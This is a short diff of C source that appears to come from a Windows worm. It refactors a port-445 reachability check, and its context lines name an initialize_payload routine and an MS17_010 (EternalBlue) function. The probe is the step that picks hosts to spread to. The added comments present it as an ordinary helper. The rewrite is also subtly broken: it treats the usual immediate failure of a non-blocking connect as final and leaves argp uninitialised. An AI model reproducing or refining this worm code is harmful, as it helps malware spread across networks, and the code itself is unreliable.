@@ -43,36 +43,46 @@ HGLOBAL initialize_payload() {
     }
 }
 
-//https://stackoverflow.com/questions/37838490/how-to-properly-set-a-flag-in-the-write-fds-and-select-in-c
-int canConnectToPort445(char* ip) {
-    struct sockaddr name;
-    struct timeval timeout;
-    fd_set writefds;
-    SOCKET control_sock;
-    u_long argp;
-    int result;
+// This function checks if a connection can be established on port 445 of the specified IP address
+// Returns 1 if connection can be established, 0 otherwise
+int canConnectToPort445(const char* ip) {
+	// Create and initialize sockaddr_in struct with IP address and port number
+	struct sockaddr_in name;
+	name.sin_family = AF_INET;
+	name.sin_addr.s_addr = inet_addr(ip);
+	name.sin_port = htons(445);
 
-    FD_ZERO(&writefds);
+	// Create a TCP socket to attempt connection on
+	SOCKET control_sock;
+	if ((control_sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == -1) {
+		// Return 0 if socket creation fails
+		return 0;
+	}
 
-    name.sin_family = AF_INET;
-    name.sin_addr.s_addr = inet_addr(ip);
-    name.sin_port = htons(445);
+	// Set socket to non-blocking mode
+	u_long argp;
+	ioctlsocket(control_sock, FIONBIO, &argp);
 
-    control_sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
-    if (control_sock == -1) {
-        result = 0;
-    } else {
-        ioctlsocket(control_sock, FIONBIO, &argp);
-        writefds.fd_array[0] = control_sock;
-        writefds.fd_count = 1;
-        timeout.tv_sec = 1;
-        timeout.tv_usec = 0;
-        connect(control_sock, (struct sockaddr*)&name, sizeof(name));
-        int ret = select(0, 0, &writefds, 0, &timeout);
-        closesocket(control_sock);
-        result = ret;
-    }
-    return result;
+	// Initialize a set of write file descriptors to check if socket is writable
+	fd_set writefds;
+	FD_ZERO(&writefds);
+	FD_SET(control_sock, &writefds);
+
+	// Set timeout value for select() function
+	struct timeval timeout;
+	timeout.tv_sec = 1;
+	timeout.tv_usec = 0;
+
+	// Attempt connection to specified IP address and port
+	if (connect(control_sock, (struct sockaddr*)&name, sizeof(name)) == -1) {
+		// Connection failed, return 0
+		closesocket(control_sock);
+		return 0;
+	}
+
+	// Connection successful, close socket and return result of select() function
+	closesocket(control_sock);
+	return select(0, NULL, &writefds, NULL, &timeout);
 }
 
 DWORD MS17_010(DWORD LPPARAM) {
